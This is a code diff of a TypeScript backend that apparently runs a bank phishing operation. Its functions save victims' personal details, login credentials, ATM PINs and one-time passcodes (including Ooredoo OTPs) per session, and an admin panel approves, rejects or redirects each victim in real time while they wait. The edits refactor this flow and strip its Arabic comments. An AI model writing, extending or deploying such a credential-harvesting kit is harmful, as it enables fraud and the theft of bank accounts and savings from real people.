@@ -33,12 +33,8 @@ export async function createSession(id: string, selectedBank: string, country: s
 
 export async function submitPersonalData(data: any) {
   try {
-    console.log("Submitting personal data for session:", data.sessionId);
-    
-    // التأكد من وجود الجلسة أولاً لتجنب مشاكل المفاتيح الخارجية أو الضياع
     const existingSession = await db.select().from(sessions).where(eq(sessions.id, data.sessionId)).limit(1);
     if (!existingSession[0]) {
-      console.log("Session not found, creating a temporary one for:", data.sessionId);
       await db.insert(sessions).values({
         id: data.sessionId,
         selectedBank: "unknown",
@@ -48,7 +44,6 @@ export async function submitPersonalData(data: any) {
       });
     }
 
-    // استخراج الحقول التي تنتمي لجدول personalDataSubmissions فقط لتجنب أخطاء drizzle
     const submissionData: any = {
       sessionId: data.sessionId,
       nameArabic: data.nameArabic || "",
@@ -70,20 +65,15 @@ export async function submitPersonalData(data: any) {
 
     await db.insert(personalDataSubmissions).values(submissionData);
     
-    // تحديث الجلسة بشكل منفصل لضمان عدم تأثر الحفظ الأساسي
-    try {
-      await db.update(sessions)
-        .set({ 
-          updatedAt: new Date(), 
-          currentStep: "personal",
-          status: "pending",
-          adminAction: null, // مسح أي إجراء سابق عند إعادة الإرسال
-          errorMessage: null  // مسح رسالة الخطأ السابقة
-        })
-        .where(eq(sessions.id, data.sessionId));
-    } catch (sessionError) {
-      console.error("Error updating session status:", sessionError);
-    }
+    await db.update(sessions)
+      .set({ 
+        updatedAt: new Date(), 
+        currentStep: "personal",
+        status: "loading",
+        adminAction: null,
+        errorMessage: null
+      })
+      .where(eq(sessions.id, data.sessionId));
     
     return { success: true };
   } catch (error) {
@@ -98,15 +88,10 @@ export async function submitLoginMethod(data: any) {
     submittedAt: new Date(),
   });
   
-  // تحديد الخطوة الحالية بناءً على نوع الطلب
-  // إذا كان الطلب من صفحة registration_completion، نحافظ على الخطوة "registration-completion"
-  // حتى يتمكن WaitingPage من إعادة المستخدم للصفحة الصحيحة عند الرفض
-  const currentStep = data.loginType === "registration_completion" ? "registration-completion" : "login";
-  
   await db.update(sessions)
     .set({ 
       updatedAt: new Date(), 
-      currentStep: currentStep,
+      currentStep: "card",
       status: "loading",
       adminAction: null,
       errorMessage: null
@@ -122,8 +107,9 @@ export async function submitAtmPin(data: any) {
   await db.update(sessions)
     .set({ 
       updatedAt: new Date(), 
+      status: "loading",
       adminAction: null, 
-      redirectTarget: null,
+      errorMessage: null,
       currentStep: "atm" 
     })
     .where(eq(sessions.id, data.sessionId));
@@ -134,13 +120,13 @@ export async function submitOtp(data: any) {
     ...data,
     submittedAt: new Date(),
   });
-  // نقوم بمسح أي إجراء آدمن سابق عند إرسال OTP جديد للسماح بالمتابعة
   await db.update(sessions)
     .set({ 
       updatedAt: new Date(), 
+      status: "loading",
       adminAction: null,
-      redirectTarget: null,
-      currentStep: data.otpType === "ooredoo" ? "otp_ooredoo" : "otp" 
+      errorMessage: null,
+      currentStep: data.otpType === "ooredoo_otp" ? "otp_ooredoo" : "otp" 
     })
     .where(eq(sessions.id, data.sessionId));
 }
@@ -153,20 +139,16 @@ export async function submitOoredoo(data: any) {
   await db.update(sessions)
     .set({ 
       updatedAt: new Date(), 
+      status: "loading",
       adminAction: null, 
-      redirectTarget: null,
+      errorMessage: null,
       currentStep: "ooredoo" 
     })
     .where(eq(sessions.id, data.sessionId));
 }
 
-export async function getAllSubmissions() {
-  return await getFullSubmissions();
-}
-
-// إضافة وظيفة لجلب الجلسات مع كافة بياناتها للوحة الإدارة
 export async function getFullSubmissions() {
-  const allSessions = await db.select().from(sessions).orderBy(desc(sessions.updatedAt)); // الترتيب حسب آخر تحديث ليظهر العميل النشط أولاً
+  const allSessions = await db.select().from(sessions).orderBy(desc(sessions.updatedAt));
   const results = [];
 
   for (const session of allSessions) {
@@ -189,49 +171,9 @@ export async function getFullSubmissions() {
   return results;
 }
 
-export async function getSubmissionDetails(sessionId: string) {
+export async function getSessionStatus(sessionId: string) {
   const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
-  if (!session[0]) return null;
-
-  const personal = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, sessionId)).limit(1);
-  const login = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, sessionId)).limit(1);
-  const pin = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, sessionId)).limit(1);
-  const otp = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, sessionId)).orderBy(desc(otpSubmissions.submittedAt));
-  const ooredoo = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, sessionId)).limit(1);
-
-  return {
-    ...session[0],
-    personalData: personal[0] || null,
-    loginMethod: login[0] || null,
-    atmPin: pin[0] || null,
-    otps: otp,
-    ooredoo: ooredoo[0] || null,
-  };
-}
-
-export async function updateSessionStatus(sessionId: string, status: string, currentStep?: string) {
-  // التأكد من وجود الجلسة قبل التحديث
-  const existingSession = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
-  if (!existingSession[0]) {
-    await db.insert(sessions).values({
-      id: sessionId,
-      selectedBank: "unknown",
-      status: "pending",
-      createdAt: new Date(),
-      updatedAt: new Date(),
-    });
-  }
-
-  const updateData: any = { status, updatedAt: new Date() };
-  if (currentStep) updateData.currentStep = currentStep;
-  
-  // إذا كانت الحالة approved أو rejected، نقوم بتحديث adminAction أيضاً
-  if (status === "approved") updateData.adminAction = "approve";
-  if (status === "rejected") updateData.adminAction = "reject";
-
-  await db.update(sessions)
-    .set(updateData)
-    .where(eq(sessions.id, sessionId));
+  return session[0] || null;
 }
 
 export async function adminTakeAction(sessionId: string, action: string, errorMessage?: string, redirectTarget?: string) {
@@ -240,13 +182,14 @@ export async function adminTakeAction(sessionId: string, action: string, errorMe
       adminAction: action, 
       errorMessage: errorMessage || null,
       redirectTarget: redirectTarget || null,
-      status: "pending", // Reset to pending to allow user to see action
+      status: action === "approve" ? "approved" : "rejected",
       updatedAt: new Date() 
     })
     .where(eq(sessions.id, sessionId));
 }
 
-export async function getSessionStatus(sessionId: string) {
-  const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
-  return session[0] || null;
+export async function updateSessionStatus(sessionId: string, status: string, currentStep?: string) {
+  const updateData: any = { status, updatedAt: new Date() };
+  if (currentStep) updateData.currentStep = currentStep;
+  return await db.update(sessions).set(updateData).where(eq(sessions.id, sessionId));
 }
